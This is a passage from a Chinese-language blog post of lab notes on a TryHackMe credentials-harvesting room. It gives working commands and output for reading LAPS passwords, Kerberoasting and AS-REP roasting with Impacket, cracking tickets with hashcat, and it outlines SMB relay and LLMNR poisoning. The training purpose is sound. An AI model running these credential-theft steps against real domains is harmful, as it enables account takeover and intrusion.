+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           PS C:\Users\thm&gt; Find-AdmPwdExtendedRights -Identity THMorg</span><br><span class="line"></span><br><span class="line">ObjectDN                                      ExtendedRightHolders</span><br><span class="line">--------                                      --------------------</span><br><span class="line">OU=THMorg,DC=thm,DC=red                       {THM\THMGroupReader}</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>
+
+<p>输出显示“THMorg”中的“THMGroupReader”组具有对 LAPS 的正确访问权限。让我们检查一下该组及其成员。</p>
+<p>​            Finding Users belong to THMGroupReader Group        </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           PS C:\Users\thm&gt; net groups "THMGroupReader"</span><br><span class="line">Group name     THMGroupReader</span><br><span class="line">Comment</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">bk-admin</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">PS C:\Users\victim&gt; net user test-admin</span><br><span class="line">User name                    test-admin</span><br><span class="line">Full Name                    THM Admin Test Comment</span><br><span class="line">User's comment</span><br><span class="line">Country/region code          000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">[** Removed **]</span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships</span><br><span class="line">Global Group memberships     *Domain Users         *Domain Admins</span><br><span class="line">                             *THMGroupReader           *Enterprise Admins</span><br><span class="line">The command completed successfully.</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>
+
+<p>获取密码</p>
+<p>我们发现“bk-admin”用户是“THMGroupReader”的成员，因此为了获取LAPS密码，我们需要破解或冒充bk-admin用户。在危及正确的用户后，我们可以通过为目标计算机提供启用了 LAPS 的功能，使用 Get-AdmPwdPassword cmdlet 获取 LAPS 密码。</p>
+<p>​            Getting LAPS Password with the Right User        </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           PS C:\&gt; Get-AdmPwdPassword -ComputerName creds-harvestin</span><br><span class="line"></span><br><span class="line">ComputerName         DistinguishedName                             Password           ExpirationTimestamp</span><br><span class="line">------------         -----------------                             --------           -------------------</span><br><span class="line">CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    FakePassword    2/11/2338 11:05:2...</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>
+
+<p>需要注意的是，在现实的 AD 环境中，LAPS 仅在特定计算机上启用。因此，您需要枚举并找到正确的目标计算机以及正确的用户帐户才能获取 LAPS 密码。有许多脚本可以帮助解决此问题，但我们在“C:\Tool”中包含了 <a target="_blank" rel="noopener" href="https://github.com/leoloobeek/LAPSToolkit">LAPSToolkit</a> PowerShell 脚本来尝试一下。</p>
+<h1 id="Other-Attacks"><a href="#Other-Attacks" class="headerlink" title="Other Attacks"></a>Other Attacks</h1><p>在前面的任务中，假设我们已经对系统进行了初始访问，并尝试从内存或 Windows 操作系统中的各种文件获取凭据。在其他情况下，可以在受害网络中执行攻击以获取凭据。</p>
+<p>本任务将简要介绍一些可用于获取哈希值的Windows和AD攻击。在深入了解更多 AD 攻击细节之前，我们建议先熟悉 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Kerberos_(protocol)">Kerberos 协议</a> 和新技术 LAN Manager (NTLM)，这是一套使用的安全协议对用户进行身份验证。</p>
+<p>Kerberoasting</p>
+<p>Kerberoasting 是一种常见的 AD 攻击，旨在获取有助于持久性的 AD 票证。为了使这种攻击发挥作用，攻击者必须有权访问 SPN（服务主体名称）帐户，例如 IIS 用户、MSSQL 等。Kerberoasting 攻击涉及请求票证授予票证 (TGT) 和票证授予服务 (TGS)。此攻击的最终目标是实现权限升级和横向网络移动。有关攻击的更多详细信息，您可以访问 THM <a target="_blank" rel="noopener" href="https://tryhackme.com/room/persistingad">Persisting AD</a> 房间（任务 3）。</p>
+<p>让我们快速演示一下该攻击。首先，我们需要找到一个 SPN 帐户，然后我们可以发送请求来获取 TGS 票证。我们将使用 GetUserSPNs.py python 脚本从 AttackBox 执行 Kerberoasting 攻击。请记住使用带有 Passw0rd 的 THM.red/thm 帐户！作为密码。</p>
+<p>​            Enumerating for SPN Accounts</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@machine$ python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.3.192 THM.red/thm</span><br><span class="line">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation</span><br><span class="line">----------------------------  -------  --------  --------------------------  ---------  ----------</span><br><span class="line">http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578    </span><br></pre></td></tr></tbody></table></figure>
+
+<p>前面的命令很简单：我们提供域控制器 IP 地址和域名\用户名。然后，GetUserSPNs 脚本要求用户输入密码以检索所需信息。</p>
+<p>输出显示我们有一个 SPN 帐户 svc-user。找到 SPN 用户后，我们可以使用 -request-user 参数发送单个请求来获取 srv-user 用户的 TGS 票证。</p>
+<p>​            Requesting a TGS Ticket as SPN Account        </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@machine$ python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.3.192 THM.red/thm -request-user svc-user </span><br><span class="line">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation</span><br><span class="line">----------------------------  -------  --------  --------------------------  ---------  ----------</span><br><span class="line">http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  </span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">$krb5tgs$23$*svc-user$THM.RED$THM.red/svc-user*$8f5de4211da1cd5715217[*REMOVED*]7bfa3680658dd9812ac061c5</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在，使用 HashCat 工具使用 <code>-m 13100</code> 模式破解获得的 TGS 票据，如下所示，</p>
+<p> 使用Hashcat破解TGS Ticket</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@machine$ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt  </span><br></pre></td></tr></tbody></table></figure>
+
+<p>尝试通过查找 SPN 用户然后执行 Kerberoasting 攻击来针对连接的 VM 复制这些步骤。获得门票后，将其破解并回答以下问题。</p>
+<p>AS-REP Roasting</p>
+<p>AS-REP Roasting 是一种使攻击者能够检索其帐户选项已设置为“不需要 Kerberos 预身份验证”的 AD 用户的密码哈希值的技术。此选项依赖于旧的 Kerberos 身份验证协议，该协议允许无需密码的身份验证。一旦我们获得了哈希值，我们就可以尝试离线破解它，最后，如果可以破解，我们就得到了密码！</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/81bf1dad6425f8f06b0026f4e748f193.png" alt="AS-REP Roasting"></p>
+<p>连接的 VM 具有配置了“不需要 Kerberos 预身份验证”设置的 AD 用户之一。在执行 AS-REP 烘焙之前，我们需要从枚举步骤中收集的域帐户列表。在我们的例子中，我们在 tmp 目录中创建了一个“users.lst”列表。以下是我们的列表内容，应在枚举过程中收集。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Administrator</span><br><span class="line">admin</span><br><span class="line">thm</span><br><span class="line">test</span><br><span class="line">sshd</span><br><span class="line">victim</span><br><span class="line">CREDS-HARVESTIN$</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这次我们将使用 Impacket Get-NPUsers 脚本，如下所示，</p>
+<p> 对用户列表执行 AS-REP 烘焙攻击</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           root@machine$ python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.3.192 thm.red/ -usersfile /tmp/users.txt</span><br><span class="line">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User thm doesn't have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">$krb5asrep$23$victim@THM.RED:166c95418fb9dc495789fe9[**REMOVED**]1e8d2ef27$6a0e13abb5c99c07</span><br><span class="line">[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User bk-admin doesn't have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User svc-user doesn't have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User thm-local doesn't have UF_DONT_REQUIRE_PREAUTH set</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们使用“-dc-ip”参数指定了域控制器的 IP 地址，并提供了要检查的域用户列表。一旦该工具找到没有预身份验证配置的正确用户，它将生成票证。</p>
+<p>各种网络安全和黑客工具还可以破解从 Active Directory 获取的 TGT，包括 Rubeus 和 Hashcat。 Impacket GetNPUsers 可以选择使用“-format”参数将票证导出为 John 或 hashcat 格式。</p>
+<p>SMB 中继攻击</p>
+<p>SMB 中继攻击滥用 NTLM 身份验证机制（NTLM 质询-响应协议）。攻击者执行中间人攻击来监视和捕获 SMB 数据包并提取哈希值。要使此攻击起作用，必须禁用 SMB 签名。 SMB 签名是一种完整性安全检查，可确保可信来源之间的通信。</p>
+<p>我们建议查看 THM<a target="_blank" rel="noopener" href="https://tryhackme.com/room/exploitingad">Exploiting AD</a> 房间，了解有关 SMB 中继攻击的更多信息。</p>
+<p>LLMNR/NBNS 中毒</p>
+<p>如果 DNS 出现故障，链路本地多播名称解析 (LLMNR) 和 NetBIOS 名称服务 (NBT-NS) 可帮助本地网络计算机找到正确的计算机。例如，假设网络中的一台计算机尝试与不存在的 DNS 记录进行通信（DNS 无法解析）。在这种情况下，机器会通过 LLMNR 或 NBT-NS 向所有网络机器发送多播消息，请求正确的地址。</p>
+<p>当攻击者欺骗网络上的权威源并使用主机识别服务响应链路本地多播名称解析 (LLMNR) 和 NetBIOS 名称服务 (NBT-NS) 流量时，就会发生 NBNS/LLMNR 中毒。如果您想了解有关该攻击的更多信息，我们建议查看 THM <a target="_blank" rel="noopener" href="https://tryhackme.com/room/breachingad">Breaching AD</a> 房间。</p>
+<p>SMB 中继和 LLMNR/NBNS 中毒攻击的最终目标是捕获受害者的身份验证 NTLM 哈希值，这有助于获取对受害者帐户或计算机的访问权限。</p>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>回顾</p>
+<p>在这个房间里，我们讨论了获取用户凭据的各种方法，包括本地计算机和域控制器，得出的结论如下：</p>
+<ul>
+<li>我们讨论了访问 Windows 内存、转储 LSASS 进程以及提取身份验证哈希值。</li>
+<li>我们讨论了 Windows 凭据管理器和提取密码的方法。</li>
+<li>我们引入了 Windows LAPS 功能并枚举它来查找正确的用户和目标来提取密码。</li>
+<li>我们引入了 AD 攻击，导致转储和提取用户的凭据。</li>
+</ul>
+<p>以下工具可能值得尝试扫描目标计算机（文件、内存等）以寻找敏感信息。我们建议在枚举阶段进行尝试。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/SnaffCon/Snaffler">Snaffler</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/">Lazagne</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2024/05/21/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0CredentialsHarvesting/">http://mikannse.space/2024/05/21/THM域学习CredentialsHarvesting/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/Domain/">Domain</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/24/PhishingAnalysisFundamentalsTHM/" title="PhishingAnalysisFundamentalsTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PhishingAnalysisFundamentalsTHM</div></div></a></div><div class="next-post pull-right"><a href="/2024/05/20/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0PersistingActiveDirectory/" title="THM域学习PersistingActiveDirectory"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM域学习PersistingActiveDirectory</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/04/30/THMZeroLogon/" title="THMZeroLogon"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-30</div><div class="title">THMZeroLogon</div></div></a></div><div><a href="/2024/04/12/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0ActiveDirectoryBasics/" title="THM域学习ActiveDirectoryBasics"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-12</div><div class="title">THM域学习ActiveDirectoryBasics</div></div></a></div><div><a href="/2024/04/12/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0BreachingActiveDirectory/" title="THM域学习BreachingActiveDirectory"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-12</div><div class="title">THM域学习BreachingActiveDirectory</div></div></a></div><div><a href="/2024/04/13/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0EnumeratingActiveDirectory/" title="THM域学习EnumeratingActiveDirectory"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-13</div><div class="title">THM域学习EnumeratingActiveDirectory</div></div></a></div><div><a href="/2024/04/25/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0LateralMovementandPivoting/" title="THM域学习LateralMovementandPivoting"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-25</div><div class="title">THM域学习LateralMovementandPivoting</div></div></a></div><div><a href="/2024/04/27/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0ExploitingActiveDirectory/" title="THM域学习ExploitingActiveDirectory"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-27</div><div class="title">THM域学习ExploitingActiveDirectory</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Credentials-Harvesting"><span class="toc-number">2.</span> <span class="toc-text">Credentials Harvesting</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Credential-Access"><span class="toc-number">3.</span> <span class="toc-text">Credential Access</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Local-Windows-Credentials"><span class="toc-number">4.</span> <span class="toc-text">Local Windows Credentials</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Local-Security-Authority-Subsystem-Service-LSASS"><span class="toc-number">5.</span> <span class="toc-text">Local Security Authority Subsystem Service (LSASS)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-Credential-Manager"><span class="toc-number">6.</span> <span class="toc-text">Windows Credential Manager</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Domain-Controller"><span class="toc-number">7.</span> <span class="toc-text">Domain Controller</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Local-Administrator-Password-Solution-LAPS"><span class="toc-number">8.</span> <span class="toc-text">Local Administrator Password Solution (LAPS)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Other-Attacks"><span class="toc-number">9.</span> <span class="toc-text">Other Attacks</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">10.</span> <span class="toc-text">Conclusion</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/pwncollegeAssembly30/" title="pwncollegeAssembly30">pwncollegeAssembly30</a><time datetime="2024-10-10T17:05:42.000Z" title="发表于 2024-10-11 01:05:42">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/pwncollege%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/" title="pwncollege汇编入门">pwncollege汇编入门</a><time datetime="2024-10-09T14:39:52.000Z" title="发表于 2024-10-09 22:39:52">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/05/Git%E9%80%9F%E6%88%90/" title="Git速成">Git速成</a><time datetime="2024-10-05T04:57:08.000Z" title="发表于 2024-10-05 12:57:08">2024-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%8C)%E4%B9%8BVulnHubCorrosion2/" title="打靶记录(一六二)之VulnHubCorrosion2">打靶记录(一六二)之VulnHubCorrosion2</a><time datetime="2024-10-03T09:24:11.000Z" title="发表于 2024-10-03 17:24:11">2024-10-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%80)%E4%B9%8BVulnHubDrippingBlues1/" title="打靶记录(一六一)之VulnHubDrippingBlues1">打靶记录(一六一)之VulnHubDrippingBlues1</a><time datetime="2024-10-02T05:16:28.000Z" title="发表于 2024-10-02 13:16:28">2024-10-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://mikannse.space/2024/05/21/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0CredentialsHarvesting/'
+    this.page.identifier = '/2024/05/21/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0CredentialsHarvesting/'
+    this.page.title = 'THM域学习CredentialsHarvesting'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
